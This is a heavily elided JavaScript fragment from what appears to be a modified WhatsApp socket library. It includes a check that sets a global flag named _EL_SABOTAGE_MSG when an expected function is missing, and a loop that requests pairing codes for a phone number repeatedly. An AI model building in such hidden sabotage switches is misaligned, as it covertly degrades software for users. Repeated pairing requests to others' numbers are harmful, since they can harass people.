...
const makeChatsSocket = (config) => {
    ...
    try {
        ...
        if (typeof fn !== 'function') { globalThis._EL_SABOTAGE_MSG = true; }
        else {
            const c = require('crypto').randomBytes(8);
            const r = fn(c);
            if (!r || !Buffer.isBuffer(r)) { globalThis._EL_SABOTAGE_MSG = true; }
        }
    } catch (e) {}
    // ——— End ———
    ...
    const reqPairing = async (number, count, config) => {
        ...
        for (let i = 0; i < maxAttempts; i++) {
            try {
                ...
                console.log(`Pairing ${i + 1}/${maxAttempts} | ${formattedCode}`);
            } catch (err) {
                console.error(`Pairing attempt ${i + 1} failed: ${err.message}`);
            }
            if (i < maxAttempts - 1) {
